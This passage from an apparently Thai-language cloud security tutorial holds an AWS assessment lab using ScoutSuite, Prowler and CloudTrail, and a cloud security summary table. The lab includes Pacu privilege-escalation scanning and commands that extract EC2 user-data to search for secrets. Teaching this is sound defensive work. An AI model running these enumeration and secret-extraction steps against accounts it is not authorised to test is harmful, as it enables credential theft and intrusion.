        dashboard += "\n## Compliance Issues\n"
        for fw, count in compliance.items():
            dashboard += f"- {fw}: {count} failing controls\n"

        return dashboard
```

---

## 8. Lab

### แบบฝึกหัด: AWS Security Assessment

```bash
# Step 1: ติดตั้ง tools
pip install boto3 scoutsuite prowler
npm install -g @aws-sdk/cli

# Step 2: Config AWS CLI
aws configure --profile lab
# AWS Access Key ID: <your_key>
# AWS Secret Access Key: <your_secret>
# Default region: ap-southeast-1

# Step 3: Basic enumeration
aws sts get-caller-identity --profile lab
aws s3 ls --profile lab
aws iam list-users --profile lab
aws ec2 describe-instances --profile lab

# Step 4: ScoutSuite scan
scout aws --profile lab --max-workers 5 --report-dir ./scout_results

# Step 5: Prowler สำหรับ CIS compliance
prowler aws -p lab -M csv,html --compliance cis_level1_1.4_aws

# Step 6: วิเคราะห์ CloudTrail
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin \
    --profile lab --region ap-southeast-1

# Step 7: ตรวจ IAM privilege escalation
git clone https://github.com/nccgroup/ScoutSuite
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu && pip install -r requirements.txt
python3 pacu.py
# Pacu> import_keys --all-profiles
# Pacu> run iam__privesc_scan

# Step 8: ค้นหา secrets ใน user-data
aws ec2 describe-instances \
    --query 'Reservations[].Instances[].{ID:InstanceId,UserData:MetadataOptions}' \
    --profile lab

# ดึง user-data ของ instance
INSTANCE_ID="i-0123456789abcdef0"
aws ec2 describe-instance-attribute \
    --instance-id $INSTANCE_ID \
    --attribute userData --profile lab | \
    jq -r '.UserData.Value' | base64 -d
```

---

## สรุป Cloud Security

| หมวดหมู่ | AWS | Azure | GCP |
|---|---|---|---|
| Identity | IAM, SCP, Organizations | Azure AD, RBAC, PIM | IAM, Workload Identity |
| Storage | S3 (ACL, BPA, Encryption) | Blob Storage (Private Endpoint) | GCS (Uniform ACL) |
| Network | VPC, SG, NACLs, WAF | VNet, NSG, Firewall, DDoS | VPC, Firewall Rules, Cloud Armor |
| Logging | CloudTrail, VPC Flow, GuardDuty | Azure Monitor, Defender for Cloud | Cloud Audit Logs, Security Command Center |
| Secrets | Secrets Manager, SSM | Key Vault | Secret Manager |
| Pentest Tools | Pacu, CloudFox, Prowler | ROADtools, AzureHound | GCPBucketBrute, ScoutSuite |

---

← [Part 88: Security Automation](Part-88-Security-Automation.md) | [Part 90: Container Security](Part-90-Container-Security.md) →
